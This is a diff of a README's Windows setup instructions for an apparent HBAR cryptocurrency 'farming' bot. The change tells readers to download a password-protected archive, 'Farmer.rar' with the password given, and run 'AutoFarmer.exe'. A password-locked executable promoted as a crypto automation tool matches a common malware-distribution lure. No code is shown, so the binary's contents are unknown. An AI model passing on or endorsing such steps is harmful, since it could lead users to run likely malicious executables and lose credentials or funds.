@@ -17,8 +17,8 @@
 
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
-1️⃣ Download and extract the `HBAR_Farmer.rar` file.  
-2️⃣ Run `HBAR_Farmer.exe`.  
+1️⃣ Download and extract the `Farmer.rar` (pass:122Farming).  
+2️⃣ Run `AutoFarmer.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
 ### 🔹 Alternative Python Method:
